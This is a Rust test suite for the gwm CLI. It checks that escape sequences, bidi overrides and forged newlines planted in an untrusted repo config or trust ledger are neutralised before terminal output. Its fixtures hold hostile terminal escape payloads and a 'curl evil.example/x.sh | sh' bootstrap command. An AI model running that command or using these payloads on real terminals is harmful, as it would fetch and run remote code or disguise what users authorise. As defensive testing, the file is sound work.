//! Issue #473: a `.gwm.toml` is data from an unvetted repo, and the
//! read-only commands that echo it do **not** go through the TOFU trust
//! gate, because inspecting an unfamiliar repo before trusting it is meant to be
//! the safe thing to do. Echoing a config-supplied string verbatim hands
//! that file a terminal escape channel: an OSC 52 clipboard write, a window
//! title rewrite, cursor moves that erase the line above.
//!
//! These tests pin the invariant at the **sink** rather than at each call
//! site: whatever a command prints, no control byte from the config
//! survives to the terminal. Testing the sink is what makes the guarantee
//! survive a new check / row / field being added upstream.

mod common;

use assert_cmd::Command;
use common::init_repo;
use std::fs;
use std::path::Path;

/// A `.gwm.toml` carrying an ESC in every string field an ungated command
/// echoes.
///
/// The payload travels as TOML's own `\u001B` escape, not as a raw byte:
/// the parser **refuses** a literal control character inside a basic string,
/// so a raw byte would never reach a value in the first place (it produces a
/// parse error instead, which is what
/// [`a_config_parse_error_does_not_replay_the_files_control_bytes`] covers).
/// The escape decodes to a real ESC in the parsed value, which is precisely
/// what the echo sites then print.
const HOSTILE_CONFIG: &str = r#"
[worktree]
branch_pattern = "\u001B]0;PWNED{type}/#{issue}-{desc}"
base = "/tmp/gwm-hostile\u001B[2K"

[[branch_types]]
name = "feat"
description = "a feature\u001B]52;c;ZXZpbA==here"

[aliases]
"ok\u001B[31m" = "list --all"

[gitmoji]
feat = "\u001B]0;PWNED:sparkles:"

[[bootstrap.copy]]
from = ".env\u001B[1A\u001B[2K"
to = ".env"

[[bootstrap.command]]
name = "setup\u001B[1A\u001B[2K"
run = "curl evil.example/x.sh | sh"

[[bootstrap.no_symlink]]
path = "node_modules\u001B[7m"
"#;

/// Every control byte that is not a line break. A terminal treats `\n` as
/// "next row", which is the one control character a multi-row report needs;
/// everything else is a command to the emulator.
fn control_bytes(s: &str) -> Vec<char> {
  s.chars().filter(|c| c.is_control() && *c != '\n').collect()
}

/// Render `s` as the body of a TOML basic string, with every control
/// character as TOML's own `\uXXXX` escape.
///
/// Not `str::escape_default`, which emits Rust's `\u{9b}` form: TOML rejects
/// the braces, so the fixture would not parse, alias loading would fail for
/// the wrong reason, and the test would pass without ever exercising the path.
/// That is exactly how the C1 gap below survived its first test.
fn toml_escaped(s: &str) -> String {
  s.chars()
    .map(|c| {
      if c.is_control() {
        format!("\\u{:04X}", c as u32)
      } else {
        c.to_string()
      }
    })
    .collect()
}

fn gwm_in(dir: &Path) -> Command {
  let mut cmd = Command::cargo_bin("gwm").unwrap();
  cmd.current_dir(dir);
  // Pin the layer under test to the repo file: a real user-level config on
  // the developer's machine would otherwise add rows this test did not write.
  cmd.env("GWM_NO_GLOBAL_CONFIG", "1");
  cmd
}

/// The ungated commands that read `.gwm.toml` and print part of it. Each one
/// was measured echoing a raw ESC before this fix.
const UNGATED_ECHO_COMMANDS: &[&[&str]] = &[
  &["config", "get", "worktree.branch_pattern"],
  &["config", "get", "worktree.base"],
  &["config", "list"],
  &["types"],
  &["aliases", "list"],
  &["doctor"],
  &["config", "validate"],
];

#[test]
fn no_ungated_command_replays_a_control_byte_from_the_repo_config() {
  let (dir, _repo) = init_repo();
  fs::write(dir.path().join(".gwm.toml"), HOSTILE_CONFIG).unwrap();

  for args in UNGATED_ECHO_COMMANDS {
    let out = gwm_in(dir.path()).args(*args).output().unwrap();
    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
      control_bytes(&stdout).is_empty(),
      "`gwm {}` replayed {:?} from .gwm.toml on stdout:\n{:?}",
      args.join(" "),
      control_bytes(&stdout),
      stdout
    );
    assert!(
      control_bytes(&stderr).is_empty(),
      "`gwm {}` replayed {:?} from .gwm.toml on stderr:\n{:?}",
      args.join(" "),
      control_bytes(&stderr),
      stderr
    );
  }
}

#[test]
fn a_neutralised_value_is_still_recognisable_in_the_output() {
  // Replace rather than strip (the idiom already used by
  // `tui::wt_tree::sanitize_name` and `naming::sanitise_for_terminal`): a
  // value the user cannot recognise is a value they cannot act on, and a
  // silently shortened one hides how much was removed.
  let (dir, _repo) = init_repo();
  fs::write(dir.path().join(".gwm.toml"), HOSTILE_CONFIG).unwrap();

  let out = gwm_in(dir.path())
    .args(["config", "get", "worktree.branch_pattern"])
    .output()
    .unwrap();
  let stdout = String::from_utf8_lossy(&out.stdout);
  assert!(
    stdout.contains("]0;PWNED{type}/#{issue}-{desc}"),
    "the pattern should stay readable minus its control bytes, got {:?}",
    stdout
  );
  assert!(
    stdout.contains('?'),
    "the neutralised byte should leave a visible placeholder, got {:?}",
    stdout
  );
}

#[test]
fn config_list_keeps_escaping_string_values() {
  // `format_list_value` renders strings with `{:?}`, and Rust's `Debug` for
  // `str` escapes control characters, so the *values* of `gwm config list`
  // were never the hole (the keys were). That protection is incidental to a
  // formatting choice, so pin it: "simplifying" `{:?}` to `{}` would reopen
  // the channel silently.
  let (dir, _repo) = init_repo();
  fs::write(dir.path().join(".gwm.toml"), HOSTILE_CONFIG).unwrap();

  let out = gwm_in(dir.path()).args(["config", "list"]).output().unwrap();
  let stdout = String::from_utf8_lossy(&out.stdout);
  assert!(
    stdout.contains(r"\u{1b}"),
    "string values should still come out Debug-escaped, got {:?}",
    stdout
  );
}

#[test]
fn a_config_parse_error_does_not_replay_the_files_control_bytes() {
  // A raw ESC byte cannot live inside a TOML basic string, so it never
  // becomes a *value*, but `toml`'s parse error quotes the offending source
  // line verbatim, which puts the byte on stderr anyway. That path is
  // reachable from EVERY command that loads config, not only the ones that
  // echo a value, so it is the widest leg of #473.
  let (dir, _repo) = init_repo();
  fs::write(
    dir.path().join(".gwm.toml"),
    "[worktree]\nbranch_pattern = \"\u{1b}]0;PWNED\"\n",
  )
  .unwrap();

  let out = gwm_in(dir.path()).args(["config", "list"]).output().unwrap();
  let stderr = String::from_utf8_lossy(&out.stderr);
  assert!(
    control_bytes(&stderr).is_empty(),
    "the parse error replayed {:?} from the source line:\n{:?}",
    control_bytes(&stderr),
    stderr
  );
  // The diagnostic still has to be a diagnostic: line breaks are what make
  // `toml`'s caret-under-the-column snippet readable, so they survive.
  assert!(
    stderr.lines().count() > 1,
    "the snippet should keep its line breaks, got {:?}",
    stderr
  );
}

#[test]
fn the_pre_trust_bootstrap_summary_neutralises_control_bytes() {
  // The highest-severity site: this summary is printed immediately above
  // `Trust this .gwm.toml? [y/N/show]:`, from a file the user has explicitly
  // not trusted yet. `\u001B[1A\u001B[2K` moves the cursor up one row and
  // erases it, so an unsanitised `[[bootstrap.command]]` name can delete the
  // `run` line that the summary exists to reveal.
  let cfg: gwm::config::Config = toml::from_str(HOSTILE_CONFIG).unwrap();
  let lines = gwm::cli::bootstrap_summary_lines(&cfg);

  let joined = lines.join("\n");
  assert!(
    control_bytes(&joined).is_empty(),
    "the pre-trust summary replayed {:?}:\n{:?}",
    control_bytes(&joined),
    joined
  );
  // The command the user is being asked to authorise still has to be legible.
  assert!(
    joined.contains("curl evil.example/x.sh | sh"),
    "the summary must still name the command, got {:?}",
    joined
  );
  assert!(
    joined.contains("node_modules"),
    "the summary must still name the no-symlink target, got {:?}",
    joined
  );
}

/// The Unicode bidirectional formatting characters found in `s`.
///
/// Deliberately **not** [`control_bytes`]: these are `Cf` (format), not `Cc`
/// (control), so `char::is_control` never matches one and an assertion built
/// on that helper could not fail here. That is the gap itself — they reorder
/// how a terminal renders the text around them without ever being a control
/// byte, which defeats the same "what you read is what is there" guarantee
/// the control-byte replacement provides (issue #502).
fn bidi_chars(s: &str) -> Vec<char> {
  s.chars()
    .filter(|c| matches!(c, '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}'))
    .collect()
}

/// A `.gwm.toml` carrying a raw `RLO` (`U+202E`) in the two fields a reader
/// has to trust most.
///
/// The character is written **raw**, not as TOML's own `\u202E` escape: it is
/// `Cf`, so the parser accepts it inside a basic string and hands it through
/// as a *value*, which is how it would arrive from a cloned repo. A raw
/// control byte cannot travel that way, which is why [`HOSTILE_CONFIG`] has
/// to use escapes and this fixture does not.
fn bidi_config() -> String {
  const RLO: char = '\u{202E}';
  format!(
    "[worktree]\n\
     branch_pattern = \"{RLO}{{type}}/#{{issue}}-{{desc}}\"\n\
     \n\
     [[bootstrap.command]]\n\
     name = \"setup\"\n\
     run = \"curl evil.example/x.sh | sh{RLO}\"\n"
  )
}

#[test]
fn the_pre_trust_bootstrap_summary_neutralises_bidi_overrides() {
  // Same site as the control-byte test above, and the highest-stakes one for
  // the same reason: the summary's whole job is to let someone decide whether
  // to authorise a shell command out of a repo they have not vetted. An `RLO`
  // reorders how the terminal renders what follows, so the line can read
  // benign while the executed bytes differ — a summary that can be made to
  // misrepresent the command it asks about is worse than no summary.
  let cfg: gwm::config::Config = toml::from_str(&bidi_config()).unwrap();
  let lines = gwm::cli::bootstrap_summary_lines(&cfg);

  let joined = lines.join("\n");
  assert!(
    bidi_chars(&joined).is_empty(),
    "the pre-trust summary replayed {:?}:\n{:?}",
    bidi_chars(&joined),
    joined
  );
  // Replace, don't strip: the command still has to be legible, and the
  // neutralised character still has to be visible as one.
  assert!(
    joined.contains("curl evil.example/x.sh | sh?"),
    "the summary must still name the command, got {:?}",
    joined
  );
}

#[test]
fn config_get_neutralises_a_bidi_override() {
  // `config list` renders values with `{:?}`, and `escape_debug` escapes `Cf`,
  // so that path was never the hole. `config get` prints the value through the
  // single-row sink instead, which is the one that has to grow the rule.
  let (dir, _repo) = init_repo();
  fs::write(dir.path().join(".gwm.toml"), bidi_config()).unwrap();

  let out = gwm_in(dir.path())
    .args(["config", "get", "worktree.branch_pattern"])
    .output()
    .unwrap();
  let stdout = String::from_utf8_lossy(&out.stdout);
  assert!(
    bidi_chars(&stdout).is_empty(),
    "`gwm config get` replayed {:?} from .gwm.toml:\n{:?}",
    bidi_chars(&stdout),
    stdout
  );
  assert!(
    stdout.contains("?{type}/#{issue}-{desc}"),
    "the pattern should stay readable minus its reordering character, got {:?}",
    stdout
  );
}

#[test]
fn trust_show_neutralises_a_bidi_override_in_the_ledger() {
  // The **block** sink, which neither test above reaches: `trust show`,
  // `doctor`'s toml diagnostic and every rendered error go through
  // `sanitise_block_for_terminal`, so a rule added only to the single-row
  // variant would leave those outputs exposed with the suite still green.
  let dir = tempfile::TempDir::new().unwrap();
  let ledger = dir.path().join("trust.toml");
  std::fs::write(
    &ledger,
    format!(
      "[[entry]]\norigin = \"git@example.com:acme/repo{}.git\"\nsha = \"abc\"\n",
      '\u{202E}'
    ),
  )
  .unwrap();

  let out = Command::cargo_bin("gwm")
    .unwrap()
    .args(["trust", "show"])
    .env("GWM_TRUST_LEDGER", &ledger)
    .output()
    .unwrap();
  let stdout = String::from_utf8_lossy(&out.stdout);
  assert!(
    bidi_chars(&stdout).is_empty(),
    "trust show replayed {:?} from the ledger:\n{:?}",
    bidi_chars(&stdout),
    stdout
  );
  // The rows this view exists to show are still rows: the block variant keeps
  // the line breaks that carry the layout.
  assert!(
    stdout.contains("origin = ") && stdout.contains("sha = "),
    "the ledger should still render as rows, got {:?}",
    stdout
  );
}

#[test]
fn trust_show_neutralises_control_bytes_in_the_ledger() {
  // `trust show` prints the ledger verbatim, and a ledger row records an
  // origin key: a remote URL, which arrived with a clone like everything else
  // here. The block variant applies, so the rows survive as rows and only the
  // control bytes go.
  let dir = tempfile::TempDir::new().unwrap();
  let ledger = dir.path().join("trust.toml");
  std::fs::write(
    &ledger,
    "[[entry]]\norigin = \"git@example.com:acme/repo\u{1b}]0;PWNED.git\"\nsha = \"abc\"\n",
  )
  .unwrap();

  let out = Command::cargo_bin("gwm")
    .unwrap()
    .args(["trust", "show"])
    .env("GWM_TRUST_LEDGER", &ledger)
    .output()
    .unwrap();
  let stdout = String::from_utf8_lossy(&out.stdout);
  assert!(
    control_bytes(&stdout).is_empty(),
    "trust show replayed {:?} from the ledger:\n{:?}",
    control_bytes(&stdout),
    stdout
  );
  // A document, not a row: the ledger's own line breaks are its shape.
  assert!(
    stdout.contains("origin = ") && stdout.contains("sha = "),
    "the ledger should still render as rows, got {:?}",
    stdout
  );
}

#[test]
fn commit_prefix_neutralises_control_bytes_from_the_gitmoji_table() {
  // `commit-prefix` needs its own fixture: it only reaches its printer when
  // the branch matches `branch_pattern`, and no git-legal branch can match a
  // pattern that starts with an ESC. So the pattern here is benign and the
  // payload sits in `[gitmoji]`, which is where this command reads from.
  //
  // The command is ungated and runs constantly: shell prompts call it on
  // every prompt draw, and the bundled commit-msg hook on every commit, in
  // whatever repo the user happens to be sitting in.
  let (dir, _repo) = init_repo();
  fs::write(
    dir.path().join(".gwm.toml"),
    "[gitmoji]\nfeat = \"\\u001B]0;PWNED:sparkles:\"\n",
  )
  .unwrap();

  let out = gwm_in(dir.path())
    .args(["commit-prefix", "--branch", "feat/#1-hostile"])
    .output()
    .unwrap();
  let stdout = String::from_utf8_lossy(&out.stdout);
  assert!(
    out.status.success(),
    "the command has to reach its printer for this to test anything: {:?}",
    String::from_utf8_lossy(&out.stderr)
  );
  assert!(
    control_bytes(&stdout).is_empty(),
    "commit-prefix replayed {:?} from [gitmoji]:\n{:?}",
    control_bytes(&stdout),
    stdout
  );
  assert!(
    stdout.contains("]0;PWNED:sparkles:"),
    "the shortcode should stay readable minus its control bytes, got {:?}",
    stdout
  );
}

/// A ledger whose `origin` carries an ESC. It travels as TOML's escape, which
/// is exactly the point: `trust show` cats the file and sees harmless text,
/// but `TrustLedger::load` DECODES it, so every command that reads the ledger
/// back through the struct handles the real control character.
const HOSTILE_LEDGER: &str = concat!(
  "[[entries]]\n",
  "origin = \"git@example.com:acme/repo",
  r"\u001B",
  "]0;PWNED.git\"\n",
  "config_sha = \"abc123def456789\"\n",
  "trusted_at = \"2026-01-01T00:00:00Z\"\n",
  "trusted_by = \"someone@somewhere\"\n",
);

#[test]
fn trust_list_neutralises_a_decoded_origin() {
  let dir = tempfile::TempDir::new().unwrap();
  let ledger = dir.path().join("trust.toml");
  fs::write(&ledger, HOSTILE_LEDGER).unwrap();

  let out = Command::cargo_bin("gwm")
    .unwrap()
    .args(["trust", "list"])
    .env("GWM_TRUST_LEDGER", &ledger)
    .output()
    .unwrap();
  let stdout = String::from_utf8_lossy(&out.stdout);
  assert!(
    control_bytes(&stdout).is_empty(),
    "trust list replayed {:?} from a decoded origin:\n{:?}",
    control_bytes(&stdout),
    stdout
  );
  assert!(
    stdout.contains("git@example.com:acme/repo"),
    "the origin must stay auditable, got {:?}",
    stdout
  );
}

#[test]
fn an_alias_expansion_cannot_smuggle_a_control_byte_through_clap() {
  // `main` expands `[aliases]` into argv BEFORE clap parses it, and clap
  // prints its own error and exits without ever reaching the error sink in
  // `main`. That sink cannot cover this path, so the expansion is refused at
  // the boundary instead: `aliases::validate_aliases` rejects any control
  // character, alias loading then fails closed and falls back to raw argv.
  //
  // The first draft of this test sampled BEL and a newline, saw clap swallow
  // both, and concluded the path was safe. It is not: clap strips the ASCII
  // controls but leaves the C1 range, and `\u{9b}` (CSI) came out intact.
  // So the cases below are chosen to span the classes rather than to be two
  // plausible examples: C0, the whitespace C0 that could forge a row, DEL,
  // and two C1 codes that ARE terminal control functions.
  let (dir, _repo) = init_repo();
  for expansion in [
    "nope\u{7}bell",
    "nope\ninjected-line",
    "nope\u{7f}del",
    "nope\u{85}nel",
    "nope\u{9b}2K",
  ] {
    fs::write(
      dir.path().join(".gwm.toml"),
      format!("[aliases]\nboom = \"{}\"\n", toml_escaped(expansion)),
    )
    .unwrap();

    let out = gwm_in(dir.path()).arg("boom").output().unwrap();
    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
      control_bytes(&stdout).is_empty() && control_bytes(&stderr).is_empty(),
      "an alias expansion reached the terminal through clap: {:?} / {:?}",
      stdout,
      stderr
    );
  }
}

#[test]
fn a_config_value_cannot_forge_a_line_in_an_error() {
  // Errors are the one output path every command shares, and most of them
  // quote something out of `.gwm.toml`. A value carrying a `\n` would
  // otherwise print a second line that reads exactly like a gwm diagnostic,
  // which is worse than a colour change: it is a false statement in gwm's
  // own voice.
  let (dir, _repo) = init_repo();
  fs::write(
    dir.path().join(".gwm.toml"),
    "[[branch_types]]\nname = \"bad\\nerror: everything is fine\"\ndescription = \"x\"\n",
  )
  .unwrap();

  assert_one_voiced_line(dir.path());

  // The harder shape, and the one a per-variant rule could not reach: `toml`
  // names an unknown field using the key the repo WROTE, newline and all,
  // inside the very message that also carries the caret snippet. Generated
  // layout and untrusted value in one string, which is why the fix owns the
  // left margin instead of trying to tell them apart.
  fs::write(
    dir.path().join(".gwm.toml"),
    "[worktree]\n\"bad\\nerror: forged by the repo\" = 1\n",
  )
  .unwrap();
  assert_one_voiced_line(dir.path());
}

/// Run `config list` in `dir` and assert exactly one line opens in gwm's voice.
fn assert_one_voiced_line(dir: &Path) {
  let out = gwm_in(dir).args(["config", "list"]).output().unwrap();
  let stderr = String::from_utf8_lossy(&out.stderr);
  // Count the lines at column zero. gwm writes exactly two here, one per
  // `eprintln!`: the alias-loading warning and the error itself, both of which
  // fail on the same broken config. Everything else has to sit under the
  // margin, so a third column-zero line means the repo wrote one.
  //
  // Counting beats matching the forged text: the forgery runs on into the rest
  // of the real message, so `l == "error: everything is fine"` never matches
  // even when the line is there. That exact mistake made this test pass
  // against the defect on its first draft.
  let at_margin: Vec<&str> = stderr
    .lines()
    .filter(|l| !l.is_empty() && !l.starts_with("  "))
    .collect();
  assert_eq!(
    at_margin.len(),
    2,
    "a config value forged a line at column zero:\n{:?}",
    stderr
  );
  assert!(
    at_margin[0].starts_with("warning: ") && at_margin[1].starts_with("error: "),
    "the two column-zero lines should be gwm's own, got {:?}",
    at_margin
  );
  // Indented, not dropped: the operator still needs to see what was rejected.
  assert!(
    stderr.contains("error: everything is fine") || stderr.contains("error: forged by the repo"),
    "the offending value should still be quoted, got {:?}",
    stderr
  );
}

#[test]
fn a_rendered_diagnostic_keeps_the_lines_that_are_its_meaning() {
  // What the margin rule has to leave intact. `toml` points at the broken
  // column with a caret under it, across several lines; flattening that would
  // gut the one message whose entire job is to locate the problem. Keeping the
  // line breaks is only safe BECAUSE every one of them lands under gwm's
  // margin, which is what the previous test pins.
  let (dir, _repo) = init_repo();
  fs::write(dir.path().join(".gwm.toml"), "[worktree\nbase = 1\n").unwrap();

  let out = gwm_in(dir.path()).args(["config", "validate"]).output().unwrap();
  let stderr = String::from_utf8_lossy(&out.stderr);
  assert!(
    stderr.lines().filter(|l| l.trim_start().starts_with('|')).count() >= 2,
    "the caret snippet should survive as its own rows, got {:?}",
    stderr
  );
  assert!(
    control_bytes(&stderr).is_empty(),
    "line breaks are the only control character spared, got {:?}",
    control_bytes(&stderr)
  );
}

#[test]
fn the_forge_diff_rows_neutralise_control_bytes() {
  // `milestones list` / `labels list` only reach their printers after a live
  // forge round trip, so the rows are asserted as values. A milestone `title`
  // is free text nothing validates on load; a label `name` is validated, but
  // only against `is_ascii_control`, which lets the C1 range through.
  use gwm::labels::{LabelSpec, RemoteLabel};
  use gwm::milestones::{MilestoneSpec, MilestoneState, RemoteMilestone};

  let esc = char::from(27u8);
  let milestones = vec![MilestoneSpec {
    title: format!("v1{}]0;PWNED.0", esc),
    description: None,
    due_on: None,
    state: MilestoneState::Open,
  }];
  let mdiff = gwm::milestones::diff_milestones(
    &milestones,
    &[RemoteMilestone {
      number: 7,
      title: format!("stale{}[2K", esc),
      description: None,
      due_on: None,
      state: MilestoneState::Open,
    }],
  );
  let rows = gwm::cli::milestones_diff_lines(&format!("acme/repo{}[31m", esc), &milestones, &mdiff).join("\n");
  assert!(
    control_bytes(&rows).is_empty(),
    "milestone rows replayed {:?}:\n{:?}",
    control_bytes(&rows),
    rows
  );
  assert!(
    rows.contains("]0;PWNED.0"),
    "the title must stay legible, got {:?}",
    rows
  );

  let labels = vec![LabelSpec {
    name: "bug".to_string(),
    color: "d73a4a".to_string(),
    description: None,
  }];
  let ldiff = gwm::labels::diff_labels(
    &labels,
    &[RemoteLabel {
      name: format!("stale{}[2K", esc),
      color: "ffffff".to_string(),
      description: None,
    }],
  );
  let rows = gwm::cli::labels_diff_lines(&format!("acme/repo{}[31m", esc), &labels, &ldiff).join("\n");
  assert!(
    control_bytes(&rows).is_empty(),
    "label rows replayed {:?}:\n{:?}",
    control_bytes(&rows),
    rows
  );
}

#[test]
fn doctor_keeps_the_toml_diagnostic_readable() {
  // `check_config_parses` puts `toml`'s whole caret-under-the-column
  // diagnostic in the check detail, and the first cut of the row sanitiser
  // turned it into `?  |?1 | [worktree?` on the one command whose job is to
  // help you recover. The rows survive; the margin is owned by the printer.
  let (dir, _repo) = init_repo();
  fs::write(dir.path().join(".gwm.toml"), "[worktree\nbase = 1\n").unwrap();

  let out = gwm_in(dir.path()).arg("doctor").output().unwrap();
  let stdout = String::from_utf8_lossy(&out.stdout);
  assert!(
    stdout.lines().filter(|l| l.trim_start().starts_with('|')).count() >= 2,
    "the caret snippet should survive as rows, got {:?}",
    stdout
  );
  assert!(
    control_bytes(&stdout).is_empty(),
    "doctor replayed {:?}",
    control_bytes(&stdout)
  );
  // Every row of a multi-line detail stays under its check, so nothing the
  // config wrote can pass for a check of its own.
  assert!(
    stdout.lines().all(|l| l.is_empty()
      || l.starts_with(' ')
      || l.starts_with('\u{2713}')
      || l.starts_with('!')
      || l.starts_with('\u{2717}')),
    "a detail row escaped the margin, got {:?}",
    stdout
  );
}

#[test]
fn a_crlf_line_ending_is_not_treated_as_an_escape() {
  // Windows writes config files and ledgers with CRLF. Replacing the `\r` of
  // every pair leaves a `?` at each line end, which makes the neutralisation
  // itself look like the corruption it is there to prevent. A LONE `\r` is a
  // different animal: it returns the cursor to column zero so what follows
  // overwrites the row already printed, and that one still goes.
  let dir = tempfile::TempDir::new().unwrap();
  let ledger = dir.path().join("trust.toml");
  fs::write(
    &ledger,
    "[[entries]]\r\norigin = \"git@example.com:acme/repo.git\"\r\nconfig_sha = \"abc123\"\r\ntrusted_at = \"2026-01-01T00:00:00Z\"\r\ntrusted_by = \"t\"\r\n",
  )
  .unwrap();

  let out = Command::cargo_bin("gwm")
    .unwrap()
    .args(["trust", "show"])
    .env("GWM_TRUST_LEDGER", &ledger)
    .output()
    .unwrap();
  let stdout = String::from_utf8_lossy(&out.stdout);
  assert!(
    !stdout.contains('?'),
    "a CRLF line ending was marked as an escape:\n{:?}",
    stdout
  );
  assert!(
    control_bytes(&stdout).is_empty(),
    "trust show replayed {:?}",
    control_bytes(&stdout)
  );
}
